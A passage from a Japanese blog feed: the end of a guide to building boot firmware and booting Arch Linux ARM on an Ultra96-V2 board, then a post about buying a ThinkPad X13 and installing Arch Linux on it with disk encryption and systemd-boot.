<p>Ultra96 では、PMU Firmware のデフォルトで無効になっているいくつかのオプションを指定してやると便利です。基板上の電源ボタンでシャットダウンが効くように、<code>Makefile</code> の <code>CFLAGS</code> に <code>-DENABLE_MOD_ULTRA96</code> および <code>-DULTRA96_VERSION=&lt;Ultra96 のバージョン&gt;</code> を追記します。</p>
<pre><code>$ sed -i 's/^\(CFLAGS :=.*$\)/\1 -DENABLE_MOD_ULTRA96 -DULTRA96_VERSION=2/' pmufw/Makefile</code></pre>
<p>また、電源ボタンやコマンドなどからのシャットダウンで完全に電源を落とすために、<code>pmufw/xpfw_config.h</code> を編集し <code>PMU_MIO_INPUT_PIN_VAL</code>, <code>BOARD_SHUTDOWN_PIN_VAL</code>, <code>BOARD_SHUTDOWN_PIN_STATE_VAL</code> を <code>1</code> に変更します。</p>
<pre><code>$ sed -i 's/^\(#define\s\+PMU_MIO_INPUT_PIN_VAL\).*/\1 (1U)/;
          s/^\(#define\s\+BOARD_SHUTDOWN_PIN_VAL\).*/\1 (1U)/;
          s/^\(#define\s\+BOARD_SHUTDOWN_PIN_STATE_VAL\).*/\1 (1U)/' pmufw/xpfw_config.h</code></pre>
<p>ソースコードの準備ができたらビルドします。ビルドに使われる aarch64 や microblaze のクロスコンパイラは、何もしなければ Vitis に入っているものが使われます。ビルドが終わると、それぞれのディレクトリに <code>executable.elf</code> が出力されます。ちなみにここで実行している <code>make</code> にビルドのジョブ数の指定オプション (<code>-jN</code>) を付けてはいけません。よくある依存関係が微妙な <code>Makefile</code> のようでビルドに失敗することがあります。</p>
<pre><code>$ make -C fsbl
$ make -C pmufw</code></pre>
<p>続いて Arm Trusted Firmware と U-Boot をビルドします。これらはソースコードを落としてきてビルドするだけなので簡単です。<code>make</code> 時にクロスコンパイラの実行ファイル名のプレフィックスを <code>CROSS_COMPILE</code> に指定すること、Arm Trusted Firmware の出力を UART 1 にするため <code>ZYNQMP_CONSOLE=cadence1</code> を付けること、U-Boot ビルド時に Arm Trusted Firmware ビルド時の生成物である <code>bl31.bin</code> のファイルパスが必要なことあたりがポイントです。U-Boot ビルド時 <code>DEVICE_TREE</code> に指定している <code>avnet-ultra96-rev1</code> は、厳密には初代 Ultra96 のものです。ただ U-Boot ではあまり関係ないのと、Linux ブート時に渡す Device Tree はまた別のものを指定できるので特に問題ないです。</p>
<pre><code>$ mkdir arm-trusted-firmware &amp;&amp; cd $_
$ curl -L https://github.com/Xilinx/arm-trusted-firmware/archive/xilinx-v2020.1.tar.gz | \
    tar xz --strip-components=1 -C .

$ CROSS_COMPILE=aarch64-linux-gnu- ARCH=aarch64 \
    make -j12 PLAT=zynqmp RESET_TO_BL31=1 ZYNQMP_CONSOLE=cadence1

$ cd ..

$ mkdir u-boot-xlnx &amp;&amp; cd $_
$ curl -L https://github.com/Xilinx/u-boot-xlnx/archive/xilinx-v2020.1.tar.gz | \
    tar xz --strip-components=1 -C .

$ CROSS_COMPILE=aarch64-linux-gnu- ARCH=aarch64 make xilinx_zynqmp_virt_defconfig
$ CROSS_COMPILE=aarch64-linux-gnu- ARCH=aarch64 \
    DEVICE_TREE=&quot;avnet-ultra96-rev1&quot; \
    BL31=$PWD/../arm-trusted-firmware/build/zynqmp/release/bl31.bin \
    make -j12 u-boot.elf

$ cd ..</code></pre>
<p>ここまででビルドしたもの、および Bitstream を適当なディレクトにコピーし、<code>bootgen</code> コマンドを使って <code>BOOT.BIN</code> ファイルを出力します。Bitstream には、<code>xsct</code> が展開したものを使うのが楽そうです。作成した <code>BOOT.BIN</code> は、SD カードの第1パーティションにコピーします。</p>
<pre><code>$ mkdir boot &amp;&amp; cd $_
$ cp ../xsct/fsbl/executable.elf fsbl.elf
$ cp ../xsct/pmufw/executable.elf pmufw.elf
$ cp ../xsct/&lt;bitstream_name&gt;.bit bitstream.bit
$ cp ../arm-trusted-firmware/build/zynqmp/release/bl31/bl31.elf .
$ cp ../u-boot-xlnx/u-boot.elf .

$ cat &gt; boot.bif &lt;&lt;EOS
the_ROM_image:
{
  [destination_cpu=a53-0, bootloader]                       fsbl.elf
  [destination_cpu=pmu]                                     pmufw.elf
  [destination_device=pl]                                   bitstream.bit
  [destination_cpu=a53-0, exception_level=el-3, trustzone]  bl31.elf
  [destination_cpu=a53-0, exception_level=el-2]             u-boot.elf
}
EOS

$ bootgen -arch zynqmp -image boot.bif -w -o BOOT.BIN
$ sudo cp BOOT.BIN /mnt/boot/</code></pre>
<p>U-Boot は、ブートデバイスに <code>boot.scr</code> という名前で保存されたスクリプトを実行してくれるみたいです。これを利用してカーネルや initramfs、Device Tree を読み込ませることにします。まず <code>boot.cmd</code> などの適当な名前でファイルを作成し、こんな感じに記述します<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fn7" class="footnote-ref" id="fnref7" role="doc-noteref"><sup>7</sup></a>。<code>bootargs</code> にはカーネルの起動オプションを、<code>fdtfile</code> には Device Tree Blob のファイル名を指定します<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fn8" class="footnote-ref" id="fnref8" role="doc-noteref"><sup>8</sup></a>。Device Tree Blob のファイルは、<code>linux-zynqmp</code> パッケージが第1パーティションにインストールしたものが使えます。Ultra96-V2 向けに編集したものも <code>avnet-ultra96-v2-rev1.dtb</code> という名前で追加してあります。</p>
<pre><code>setenv bootargs earlycon clk_ignore_unused root=/dev/mmcblk0p2 rw rootwait

setenv fdtfile xilinx/avnet-ultra96-v2-rev1.dtb

if load ${devtype} ${devnum}:${distro_bootpart} 0x00200000 /Image; then
  if load ${devtype} ${devnum}:${distro_bootpart} 0x00100000 /dtbs/${fdtfile}; then
    if load ${devtype} ${devnum}:${distro_bootpart} 0x04000000 /initramfs-linux-zynqmp.img; then
      booti 0x00200000 0x04000000:${filesize} 0x00100000;
    fi;
  fi;
fi</code></pre>
<p>U-Boot をビルドしたディレクトリに <code>mkimage</code> というツールが入っているはずです。これを使って、作成したスクリプトから <code>boot.scr</code> を出力します。出力した <code>boot.scr</code> も SD カードの第1パーティションにコピーすれば準備完了です。</p>
<pre><code>$ /path/to/u-boot-xlnx/tools/mkimage -c none -A arm64 -T script -d boot.cmd boot.scr
$ sudo cp boot.scr /mnt/boot/</code></pre>
<h3 id="起動">起動!</h3>
<p>SD カードをアンマウントしてから取り外し、Ultra96 に入れます。</p>
<pre><code>$ sudo umount /mnt{/boot,}</code></pre>
<p>Ultra96 の電源を入れると、シリアルコンソールからまず FSBL, PMU Firmware, Arm Trusted Firmware, U-Boot とメッセージが表示されます。</p>
<pre><code>Xilinx Zynq MP First Stage Boot Loader
Release 2020.1   Nov  7 2020  -  11:51:03
PMU Firmware 2020.1	Nov  7 2020   11:51:27
PMU_ROM Version: xpbr-v8.1.0-0
NOTICE:  ATF running on XCZU3EG/silicon v4/RTL5.1 at 0xfffea000
NOTICE:  BL31: v2.2(release):
NOTICE:  BL31: Built : 11:51:33, Nov  7 2020


U-Boot 2020.01 (Nov 07 2020 - 11:51:38 +0000)

Model: Avnet Ultra96 Rev1
Board: Xilinx ZynqMP
DRAM:  2 GiB
PMUFW:	v1.1
EL Level:	EL2
Chip ID:	zu3eg
(...)</code></pre>
<p>その後 <code>boot.scr</code> が読み込まれ、カーネルの実行が始まります。最後に Arch Linux のログインプロンプトが出たら成功です。</p>
<pre><code>switch to partitions #0, OK
mmc0 is current device
Scanning mmc 0:1...
Found U-Boot script /boot.scr
524 bytes read in 17 ms (29.3 KiB/s)
## Executing script at 20000000
22747648 bytes read in 1820 ms (11.9 MiB/s)
40479 bytes read in 26 ms (1.5 MiB/s)
8193054 bytes read in 668 ms (11.7 MiB/s)
## Flattened Device Tree blob at 00100000
   Booting using the fdt blob at 0x100000
   Loading Ramdisk to 7882f000, end 78fff41e ... OK
   Loading Device Tree to 000000000fff3000, end 000000000ffffe1e ... OK

Starting kernel ...

[    0.000000] Booting Linux on physical CPU 0x0000000000 [0x410fd034]
[    0.000000] Linux version 5.4.0-1-ARCH (alarm@buildenv) (gcc version 10.2.0 (GCC)) #1 SMP Mon Nov 9 07:02:37 UTC 2020
[    0.000000] Machine model: Avnet Ultra96-V2 Rev1
[    0.000000] earlycon: cdns0 at MMIO 0x00000000ff010000 (options '115200n8')
[    0.000000] printk: bootconsole [cdns0] enabled

(...)

Arch Linux 5.4.0-1-ARCH (ttyPS0)

alarm login:</code></pre>
<h2 id="tosainuzynqmp-arch-リポジトリ">Tosainu/zynqmp-arch リポジトリ</h2>
<p>GitHub リポジトリ <a href="https://github.com/Tosainu/zynqmp-arch">Tosainu/zynqmp-arch</a> には、インストール方法で少し紹介したカーネルパッケージ <code>linux-zynqmp</code> や WiFi ドライバ <code>wilc3000-ultra96v2</code> などの <code>PKGBUILD</code> ファイルを置いています。また、これらのビルド済みパッケージを GitHub Pages を利用してホストしていて、<code>/etc/pacman.conf</code> などを設定すればこれらパッケージを<code>pacman</code> 経由でインストールできます。</p>
<p>Arch Linux ARM に限らず、公式でのサポートがない何かしらの Linux ディストリビューションを、とりあえずカーネルは動く環境に載せるだけなら、rootfs にクロスコンパイルしたカーネルなどを放り込むのが1番早いと思います。実際、最初はこの方法で環境を作りいろいろ検証していました。それでもわざわざパッケージ化しているのは、自分が長く安定した Arch Linux 環境を作りたかったからです。一般ユーザで書き込めない領域を雑に弄るのは、パッケージマネージャでの更新時に壊れるおそらく1番の原因です。変に壊れる環境にしたくないので、パッケージ化は絶対やりたかったです。</p>
<p>パッケージ化したうえにビルド済みパッケージの配布環境まで整備したのは、この記事や GitHub リポジトリを見て試そうする方がいるのかはわかりませんが、せっかくインストール方法を紹介するのならできる限り敷居の低い方法にしたいと考えていたためです。そうしたとき、<code>PKGBUILD</code> を公開するだけなのは微妙です。Arch Linux パッケージのビルドにはクロスコンパイラなどを使うのがほぼ想定されていないため、実機または QEMU などによるエミュレーションなどですでに Arch Linux ARM が動いている環境が必要になります。インストール方法の紹介で構築済みの環境を要求するのはアレですし、エミュレーション環境を用意しろというのも手間のかかる上に時間がかかるので微妙です。</p>
<p>ビルド済みパッケージを配布するうえで悩んだのが、それをどこでビルドするかです。自分は出どころ・ビルドのプロセスが明確でないバイナリを拾ってきて実行するのにうーむとなるタイプなので、せめてビルドからデプロイまでをオープンな場所でやらせたい思いがありました。ただ、前述したとおり Arch Linux ARM のパッケージのビルドには Arch Linux ARM が必要です。いろいろ悩みましたが、とりあえず GitHub Actions 上で QEMU + binfmt_misc の設定をし、そこで Arch Linux ARM な Docker イメージを作成したり、作成したイメージを使ったコンテナ上でパッケージをビルドしています。もちろんこれには結構時間がかかっていて、カーネルのビルドだけで4時間ぐらいかかります。Ultra96 実機でカーネルをビルドさせたら1時間半くらいだったので、それよりも遅いことになります。頻繁にビルドさせるつもりはないので困ってはいませんが、何かしらの改善はしたいなと思っています。Travis CI や AWS の Graviton Processor が載ってるインスタンスなど ARM な環境を試すだとか、Arch Linux パッケージのクロスコンパイル方法を確立するだとか、部分的に aarch64 だったり x86_64 だったりする特殊な環境を作ってみるだとか…</p>
<h2 id="おわり">おわり</h2>
<p>Ultra96-V2 をはじめとする Zynq UltraScale+ MPSoC が載ってるボードは、単純に ARM なシングルボードコンピュータとして見てもおもしろいですし、そこから Zynq を活かせたらもっと楽しくなりそうだなと思っています。今回の Arch Linux ARM の件を通して ZU+ で動かすソフトウェアの幅がまた広がったので、今度は特に <a href="https://xilinx-wiki.atlassian.net/wiki/spaces/A/pages/18841847/Solution+ZynqMP+PL+Programming">Linux からの PL のリコンフィグレーション</a> と組み合わせて何かやってみたいですね。</p>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>つい最近 <a href="https://www.xilinx.com/support/download/index.html/content/xilinx/en/downloadNav/vivado-design-tools/2020-2.html">v2020.2</a> が出たっぽいですね。自分はまだ確認できていませんが、“- Petalinux now a part of Xilinx Unified Installer” が気になります。あの微妙なインストーラが改善されてたりするのかな…<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>Vitis はインストールサイズが 100GB 程度もあって<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/">以前紹介した</a> Docker 環境だと扱いづらくなる<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p><a href="https://www.xilinx.com/support/documentation/user_guides/ug1085-zynq-ultrascale-trm.pdf">Technical Reference Manual (ug1085)</a> の “Chapter 11: Boot and Configuration” によると FAT16 / FAT32 ともに対応しているらしい。いろいろ試した感じ、電源投入後に基板上の DONE_LED (D1) 点灯までの時間が FAT16 のほうが速い気がするので FAT16 で運用してみてる<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p>自分は F2FS を試しています<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p>Ultra96 にさした micro SD カードは特別なことをしなければ <code>/dev/mmcblk0</code> になると思うのでこれで指定しています。たくさん SATA や NVMe などのストレージを載せるマシンだと、ポートを繋ぎ変えたときなどでも目的のパーティションを確実にマウントさせるため UUID やラベルを使ったりします<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn6" role="doc-endnote"><p><code>.xsa</code> ファイルは Zip 形式で圧縮されたファイルっぽい<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn7" role="doc-endnote"><p>カーネル、<code>.dtb</code>、initramfs のアドレスは PetaLinux Tools で Linux 環境を作ったとき出力された <code>boot.scr</code> を参考にしています<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fnref7" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn8" role="doc-endnote"><p><a href="https://github.com/Xilinx/u-boot-xlnx">Xilinx/u-boot-xlnx</a> には、<code>.dtb</code> の <code>compatible</code> から <code>fdtfile</code> の初期値を決める<a href="https://github.com/Xilinx/u-boot-xlnx/blob/xilinx-v2020.2/board/xilinx/zynqmp/zynqmp.c#L462-L497">こんな処理</a>が実装されています。この関数では <code>"xlnx,zynqmp-zcu104-revA"</code> といった文字列から <code>','</code> よりあとを取り出し <code>"xilinx/zynqmp-zcu104-revA.dtb"</code> という文字列を作って <code>fdtfile</code> に指定しているのですが、<code>compatible</code> に <code>"avnet,ultra96-rev1"</code>、実際のファイル名が <code>avnet-ultra96-rev1.dtb</code> となる Ultra96 では適切なパスになってくれません。面倒だったので <code>boot.scr</code> から指定し直していますが、公式に何かしら報告したほうがいい事案な気もしています<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fnref8" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>ThinkPad X13 を買いました</title>
    <link href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/index.html" />
    <id>https://blog.myon.info/entry/2020/09/01/thinkpad-x13/index.html</id>
    <published>2020-08-31T15:30:20Z</published>
    <updated>2020-08-31T15:30:20Z</updated>
    <summary type="html"><![CDATA[<p>ノートパソコンを買いました。ThinkPad X13 Gen1 (AMD) です。4連休のセールをやっていた 7/26 に注文し 8/7 に届きました。たぶんかなり早く届いた方だと思います。</p>
<blockquote class="twitter-tweet tw-align-center" data-dnt="true">
<p lang="ja" dir="ltr">
ヾ(๑╹◡╹)ﾉ" <a href="https://t.co/65gU0z5zUU">pic.twitter.com/65gU0z5zUU</a>
</p>
— ✧<em>。ヾ(｡ᐳ﹏ᐸ｡)ﾉﾞ。</em>✧ (@myon___) <a href="https://twitter.com/myon___/status/1291559008206073856?ref_src=twsrc%5Etfw">August 7, 2020</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>今まで使っていたノートは2012年5月購入の <a href="https://www.sony.jp/vaio/products/Z23/">VAIO Z2 (VPCZ23AJ)</a> で、<a href="https://blog.myon.info/entry/2013/01/05/entry/">デスクトップを組み立てた</a>のも2013年1月なので、新しいパソコンは約8年ぶりです。わいわい。</p>
<!--more-->
<h2 id="立て続けに-pc-が不調に">立て続けに PC が不調に…</h2>
<p>上にちょっと書いたように、ここ何年かは VAIO Z2 とデスクトップ機を適当に使い分ける生活をしていました。</p>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr class="header">
<th></th>
<th>VAIO Z2</th>
<th>デスクトップ</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>CPU</td>
<td><a href="https://ark.intel.com/content/www/us/en/ark/products/53464/intel-core-i7-2640m-processor-4m-cache-up-to-3-50-ghz.html">Intel Core i7-2640M</a></td>
<td><a href="https://ark.intel.com/content/www/us/en/ark/products/63697/intel-core-i7-3930k-processor-12m-cache-up-to-3-80-ghz.html">Intel Core i7-3930K</a></td>
</tr>
<tr class="even">
<td>RAM</td>
<td>DDR3 1333MHz 4GB x 2</td>
<td>DDR3 1600MHz 8GB x 4</td>
</tr>
<tr class="odd">
<td>GPU</td>
<td>Intel HD Graphics 3000</td>
<td>NVIDIA GeForce 660 Ti</td>
</tr>
<tr class="even">
<td>ストレージ</td>
<td>64GB SSD x2 (RAID 0)</td>
<td>256GB SSD<br />3TB &amp; 4TB HDD (一部ミラーリング<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>)</td>
</tr>
<tr class="odd">
<td>主な用途</td>
<td>基本何でも</td>
<td>ノートで辛い開発<br />複数の VM を使った検証<br />データのバックアップ</td>
</tr>
</tbody>
</table>
<p>どちらも8年前のマシンなので最新のものと比べるとスペックは劣りますが、自分の普段の作業ではそんなに困ることはなく、今すぐ PC を買い換えようとは思っていませんでした。もちろん、試してみたくなったツールが AVX2 を要求してきて悲しくなったり、最新の高速ストレージを試したくなったりもしましたが、今は必要があれば大学の環境を使えたりもするので、買い換えるとしてもあと1年先かなという感じでした。</p>
<p>そんな思いでいましたが、数ヶ月前から立て続けに手持ちの PC の調子が悪くなってしまいました。</p>
<p>まず今年春くらいから、ノートで負荷をかけると接続している AC アダプタが一瞬認識されなくなるのを繰り返すようになってしまいました。バッテリは安定して充電されず、使い方によっては AC アダプタを接続しているのに残量がどんどん減っていく状態でした。トラブったときの応急処置「バラして掃除」も今回は効果なく、電源まわりが不調のまま使い続けるのは不安なのでデスクトップ中心に切り替えることにしました。</p>
<p>こうしてデスクトップをメインにして数週間たったころ、今度はマシンの排気からかすかに焼けた感じのニオイがするのに気づきます。マザーボードの VRM あたりの一部がニオイの発生源でした。軽く確認した感じでは基板上のパーツに損傷はなく、溜まったホコリか何かに熱が加わっただけかなとも思っていますが、何かあっても困るのでこれも使用を中断することにしました。</p>
<p>それからは、マザボと CPU を別マシンから持ってきたパーツに入れ替えたデスクトップ機を使っていました。CPU は <a href="https://ark.intel.com/content/www/us/en/ark/products/65693/intel-core-i3-3220-processor-3m-cache-3-30-ghz.html">i3-3220</a> です。当時クロスコンパイラをビルドしたり、とあるソフトウェアをビルド設定まわり調整のため何度もビルドするといった作業が集中していたこともあり、この変更は作業効率に響くとても痛いものでした。</p>
<blockquote class="twitter-tweet tw-align-center" data-dnt="true">
<p lang="ja" dir="ltr">
MB とか入れ替えてとりあえずの環境作ってる。Intel のドキュメントで名指しされてるとウワサの i7-3930k から i3-3220 <a href="https://t.co/KeOmagCLuY">pic.twitter.com/KeOmagCLuY</a>
</p>
— ✧<em>。ヾ(｡ᐳ﹏ᐸ｡)ﾉﾞ。</em>✧ (@myon___) <a href="https://twitter.com/myon___/status/1270882200037122050?ref_src=twsrc%5Etfw">June 11, 2020</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<h2 id="ようやく見つけた-thinkpad-x13">ようやく見つけた ThinkPad X13</h2>
<p>性能面での辛さに加え、電源やスペースの関係で設置場所を選ぶデスクトップ PC を使うことも辛くなってきました。普段クーラーのない部屋で作業していたのですが、そこを今夏の暑さが襲ったのです。流石に身の危険を感じ、クーラーのある部屋に無理やり場所を作って<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>作業をしつつ、空いた時間に PC を探すといった日々が始まったのでした。</p>
<p>とはいったものの、時期が悪かったりするせいか、なかなか良さげな機種が見つかりません。要求は</p>
<ul>
<li>13型ノート</li>
<li>1.5kg 以下</li>
<li>最新世代の CPU 搭載 (Zen 2 な Ryzen が気になる)</li>
<li>構成カスタマイズ可能</li>
</ul>
<p>という感じです。まぁ Zen 2 なモバイルプロセッサは出たばかりだしそれはそうという感じですが… そして少し待ってようやく見つけたのが今回の ThinkPad X13 です。もっと待てば選択肢が増えたりするかもとも思いましたが、できる限り早く欲しかったので、一晩悩んだ末にポチりました。</p>
<blockquote class="twitter-tweet tw-align-center" data-dnt="true">
<p lang="ja" dir="ltr">
うーん <a href="https://t.co/3GE6ihYKRX">pic.twitter.com/3GE6ihYKRX</a>
</p>
— ✧<em>。ヾ(｡ᐳ﹏ᐸ｡)ﾉﾞ。</em>✧ (@myon___) <a href="https://twitter.com/myon___/status/1286991781922353153?ref_src=twsrc%5Etfw">July 25, 2020</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>選んだ構成の主要なものをあげるとこんな感じです。</p>
<ul>
<li><a href="https://www.amd.com/en/products/apu/amd-ryzen-5-pro-4650u">AMD Ryzen 5 PRO 4650U</a></li>
<li>DDR4 3200MHz 16GB (8GB x 2)</li>
<li>M.2 PCIe-NVMe SSD 256GB</li>
<li>13.3型FHD液晶 IPS 光沢なし</li>
<li>バックライト付英語キーボード</li>
<li>指紋センサーなし</li>
<li>3年間 引き取り修理</li>
</ul>
<p>CPU には Ryzen 5 PRO を選択しました。搭載可能な RAM が最大 32GB に増える Ryzen 7 PRO とかなり迷ったのですが、単純に予算の問題と、今までデスクトップで使ってきた i7-3930K とコア数が同じということで比べやすいかなということでこうしました。RAM が 16GB なのには少し不安もありますが、今までの経験から大半の作業ではなんとか収まってくれるだろうと仕方なく妥協することにしました。</p>
<p>SSD は手元の機器では初めての PCIe-NVMe 接続なものです。VAIO Z2 の RAID 0 構成な SSD もそこそこ速い部類でしたが、これよりも強そうなので楽しみです。もともと持ち歩くデータはそんなに多くなく、容量は 128GB でも十分ではあるのですが、たまに大きなデータや FPGA とかの開発環境を持ち歩こうとして厳しくなることがあったので倍の 256GB としました。</p>
<p>キーボードは英字配列です。VAIO Z2 購入当時はあまりキーボードの配列にこだわりはなかったのですが、その後すぐ出会った HHKB Lite2 で英字配列に慣れてしまい、以来日本語キーボードでも英字設定で使ったりしてきたためです。VAIO のときはなんとなくで付けたバックライトも、暗いところで便利なのがわかった<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a>ので今回も付けました。</p>
<p>ThinkPad ユーザが愛用していそうなイメージのある指紋センサは外しました。普段 Linux を使う身としては設定がめんどくさそうに感じたのと、削って少し安くなるならそうしたかったためです。オプションの3年間の引き取り修理は、過去に ThinkPad 使いの友人を見てて不安だったので付けました。</p>
<h2 id="archlinuxinstallbattle">#archlinuxinstallbattle</h2>
<p>プリインストールされた OS<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a> で最低限の動作確認を済ませたのち、Arch Linux をインストールしました。</p>
<p><img src="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/screenfetch.png" /></p>
<p>プリインストールされた OS は、ファームウェアのアップデートやその他何かあったときのためとりあえず残し、デュアルブートを組むことにしました。パーティションを約 48GB にまで縮小し、空いた領域に Arch Linux 用のパーティションを作りました。<code>nvme0n1p1</code> が ESP、<code>nvme0n1p4</code> がシステム用の LUKS パーティション、<code>nvme0n1p5</code> が swap という感じにしました。</p>
<pre><code>$ lsblk
NAME          MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT
nvme0n1       259:0    0 238.5G  0 disk
├─nvme0n1p1   259:1    0   260M  0 part  /boot
├─nvme0n1p2   259:2    0    16M  0 part
├─nvme0n1p3   259:3    0    48G  0 part
├─nvme0n1p4   259:4    0   186G  0 part
│ └─cryptroot 254:0    0   186G  0 crypt /var/lib/docker/btrfs
├─nvme0n1p5   259:5    0   3.2G  0 part
│ └─cryptswap 254:1    0   3.2G  0 crypt [SWAP]
└─nvme0n1p6   259:6    0  1000M  0 part</code></pre>
<p>そしたらあとはいつもどおりにやるだけです。といっても、自分は Arch Linux のクリーンインストールはかなり久しぶりで、公式のインストールメディアも記憶にあるものと若干違った感じになってて戸惑うこともありました。例えば無線 LAN 接続には <code>wifi-menu</code> を使っていた覚えがあるのですが今は <a href="https://wiki.archlinux.org/index.php/Installation_guide#Connect_to_the_internet"><code>iwctl</code> になっていたり</a>、いい感じのミラーサーバを <a href="https://wiki.archlinux.org/index.php/Installation_guide#Select_the_mirrors"><code>reflector</code> が勝手に設定</a>してくれてたり。このあたりは定期的に確認しておきたいですね。</p>
<p>ブートローダには systemd-boot を使うことにしました。ディスクの暗号化をするときはカーネル、initramfs、ブートローダの設定まで LUKS 上に置ける GRUB を使いたい思いがあるのですが、Secure Boot<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a> と組み合わせたときかなり面倒になる<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fn6" class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a>ことがわかったので諦めました。systemd-boot も、起動時のメニューで OS の選択やブートオプション編集など十分な機能があったり、<code>bootctl</code> など専用のコマンドラインツールもあったりして好きですけどね。</p>
<pre><code>$ bootctl status
System:
     Firmware: UEFI 2.70 (Lenovo 0.4176)
  Secure Boot: enabled
   Setup Mode: user
 Boot into FW: supported

Current Boot Loader:
      Product: systemd-boot 246.3-1-arch
     Features: ✓ Boot counting
               ✓ Menu timeout control
               ✓ One-shot menu timeout control
               ✓ Default entry control
               ✓ One-shot entry control
               ✓ Support for XBOOTLDR partition
               ✓ Support for passing random seed to OS
               ✓ Boot loader sets ESP partition information
          ESP: /dev/disk/by-partuuid/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
         File: └─/EFI/systemd/shimx64.efi

Random Seed:
 Passed to OS: no
 System Token: set
       Exists: yes

Available Boot Loaders on ESP:
          ESP: /boot (/dev/disk/by-partuuid/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)
         File: └─/EFI/systemd/shimx64.efi
         File: └─/EFI/systemd/mmx64.efi
         File: └─/EFI/systemd/systemd-bootx64.efi (systemd-boot 246.3-1-arch)
         File: └─/EFI/systemd/grubx64.efi (systemd-boot 246.3-1-arch)
         File: └─/EFI/BOOT/bootx64.efi (systemd-boot 246.3-1-arch)

Boot Loaders Listed in EFI Variables:
        Title: Shim
           ID: 0x0002
       Status: active, boot-order
    Partition: /dev/disk/by-partuuid/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
         File: └─/EFI/systemd/shimx64.efi

        Title: Linux Boot Manager
           ID: 0x0001
       Status: inactive, boot-order
    Partition: /dev/disk/by-partuuid/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
         File: └─/EFI/systemd/systemd-bootx64.efi

        Title: Windows Boot Manager
           ID: 0x0000
       Status: active, boot-order
    Partition: /dev/disk/by-partuuid/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
         File: └─/EFI/Microsoft/Boot/bootmgfw.efi

Boot Loader Entries:
        $BOOT: /boot (/dev/disk/by-partuuid/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)

Default Boot Loader Entry:
        title: Arch Linux
           id: arch.conf
       source: /boot/loader/entries/arch.conf
        linux: /vmlinuz-linux
       initrd: /amd-ucode.img
               /initramfs-linux.img
      options: root=/dev/mapper/cryptroot rw rootflags=subvol=@ rd.luks.name=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx=cryptroot loglevel=3</code></pre>
<p>X13 での Arch Linux は、概ね問題なく動いていますが、いくつか問題もありました。気づいたもので</p>
<ul>
<li>UEFI のセットアップメニューで Sleep State を Linux にしないとスリープできない</li>
<li><a href="https://wiki.archlinux.org/index.php/backlight#Backlight_is_always_at_full_brightness_after_a_reboot_with_amdgpu_driver">画面輝度の保存・復帰が正しく動作していない</a></li>
<li>背面の microSD カードリーダーが正しく認識されていない</li>
</ul>
<p>があります。</p>
<h2 id="おわり">おわり</h2>
<p>こんな感じでようやく環境を引っ越せました。まだ使い始めて日は経っていないですが、なかなかの性能で、それでいて発熱もひどくなくファンも静かめでいい感じです。正直に書くと、ここ最近の CPU について、ベンチマークサイトを見ながら「クロックやコア数が上がってこのスコアならそれはそうだよね」などと目立った進化がない印象を持っていたところがありました。もちろんそんなことはなく、実際に8年前のデスクトップ用途に匹敵するものが薄いノートに載ってるのも1つの大きな進化なわけで、自分が典型的なベンチマークのスコアから誤った判断をするタイプになっていたのを反省です。</p>
